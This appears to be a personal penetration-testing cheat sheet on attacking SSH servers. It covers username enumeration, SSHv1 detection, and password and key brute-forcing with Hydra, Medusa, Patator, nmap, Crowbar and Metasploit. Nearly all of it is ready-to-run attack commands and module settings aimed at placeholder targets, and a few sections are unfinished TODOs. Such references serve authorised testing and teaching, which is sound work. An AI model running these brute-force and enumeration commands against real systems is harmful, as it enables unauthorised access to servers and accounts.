# SSH

## 01 - SFTP Command Execution

Once you have the SSH credentials to authenticate

```
$ ssh -v <username>@<IP> "<command>"

$ ssh -v <username>@<IP> /bin/bash
```

## 02 - Username Enumeration

TODO: Write down the CVE of what software version were affected

```
msf > use auxiliary/scanner/ssh/ssh_enumusers

msf auxiliary(scanner/ssh/ssh_enumusers) > set rhosts <IP>

run
```

## 03 - Downgraded SSH Version

```
$ nmap -p 22 --script sshv1 <IP>
```

## 04 - Bruteforce Passwords

### 4.1 - Hydra

```
$ hydra ssh -U

$ hydra -l <username> -P passwords.lst ssh://<IP>
```

### 4.2 - Medusa

```
$ medusa -M ssh [-m BANNER:OpenSSH_10.0p2] -h <IP> -u <username> -p <password>
```

### 4.3 - Patator

```
$ patator ssh_login -t <int> host=<IP> port=22 user=<username> password=FILE0 0=passwords.lst -x ignore:mesg='Authentication failed.'
```

### 4.4 - Network Mapper

```
$ nmap -p 22 -Pn -n --script ssh-brute --script-args "userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=<seconds>s" <IP>
```

### 4.5 - Metasploit

TODO: Fill this info

- Bruteforce SSH credentials

```
msf > use auxiliary/scanner/ssh/ssh_login

msf auxiliary(scanner/ssh/ssh_login) > options

msf auxiliary(scanner/ssh/ssh_login) > set
```

## 05 - Bruteforce SSH Keys

### 5.1 - Public SSH Keys

#### 5.1.1 - Network Mapper

```
$ nmap -p 22 -Pn -n --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'},publickeys={'./id_rsa1.pub', './id_rsa2.pub'}" <IP>
```

#### 5.1.2 - Metasploit

Note: Any file extension that ends with `.pub`.

```
msf > use auxiliary/scanner/ssh/ssh_identify_pubkeys

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > options

Module options (auxiliary/scanner/ssh/ssh_identify_pubkeys):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   KEY_FILE                           yes       Filename of one or several cleartext public keys.
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set user_file /path/to/users.lst

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set key_file /path/to/ssh_public_key.pub

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set rhosts <IP>

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set rport <PORT>

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set threads 4

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > run -j
```

### 5.2 - Private SSH Keys

#### 5.2.1 - Hydra

TODO: Provide a syntax to bruteforce ssh keys

```
$ hydra sshkey -U
```

#### 5.2.2 - Crowbar

TODO: Provide a syntax of sshkey to brute force targets with crowbar

```
$ crowbar -b sshkey -s <IP>/32 -u <username> -k /path/to/ssh_key_file
```

#### 5.2.3 - Network Mapper

```
$ nmap -p 22 -Pn -n --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" <IP>
```

#### 5.2.4 - Metasploit

```
msf post(multi/gather/ssh_creds) > use auxiliary/scanner/ssh/ssh_login_pubkey

msf auxiliary(scanner/ssh/ssh_login_pubkey) > options

Module options (auxiliary/scanner/ssh/ssh_login_pubkey):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   KEY_PASS                           no        Passphrase for SSH private key(s)
   KEY_PATH                           no        Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub
                                                " will be skipped. Duplicate private keys will be ignored.
   PRIVATE_KEY                        no        The string value of the private key that will be used. If you are using MSFConsole, this value shou
                                                ld be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set username <username>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set private_key file:/path/to/ssh_key

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set key_pass <passphrase>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts <IP>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set rport <PORT>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set threads <int>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set stop_on_success <true | false>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > run -j
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Ports/Cross Platform/Remote Services/SSH]]

- [[Crowbar|Crowbar]]

### Null Byte

- [Null Byte: Gain SSH Access to Servers by Brute-Forcing Credentials](https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/)

### Hacking Articles

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)

- [Hacking Articles: SSH Penetration Testing](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)

### Rapid7

- [Rapid7: Metasploit Framework - Auxiliary Scanner SSH Login Pubkey](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login_pubkey.md)

### Penetration Testing Tools

- [Penetration Testing Tools: Medusa](https://en.kali.tools/?p=200)